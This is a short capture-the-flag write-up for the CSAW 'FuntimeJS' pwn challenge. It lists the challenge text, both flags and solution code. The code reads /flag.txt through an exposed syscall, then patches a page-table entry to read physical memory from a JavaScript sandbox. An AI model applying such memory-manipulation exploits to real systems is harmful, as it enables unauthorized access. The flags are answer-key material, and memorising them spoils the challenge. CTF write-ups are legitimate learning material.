# FuntimeJS (2 Parts)
## Author

## Points
400
## Category
Pwn
## Description
Part 2 of LittleQuery (Web)
JavaScript is memory safe, right? So you can't read the flag at physical address 0xdeadbeeeef, right?
Right?
http://littlequery.chal.csaw.io
UPDATE 14:10 Eastern: I'm dumb. The unintentional solution is now in a separate challenge (FuntimeJS 2).
## Flag
`flag{1_th0t_j@vascript_w@s_mem0ry_s@f3!}`
`flag{I_f0rg0t_1n1trd_1nclud3d_a11_files}`
## Solution
Part 1:
`console.log(__SYSCALL.initrdReadFile('/flag.txt'))`
Part 2:
```
let mem = __SYSCALL.getSystemResources().memoryRange
let view = (where) => new Uint8Array(mem.block(where, 0x100).buffer())
view(0x1a01000+0x41*8).set([0xeb,0x00,0xa0,0xad,0xde])
console.log(String.fromCharCode.apply(null, view((0x41<<21) + 0x1eeeef)))
```
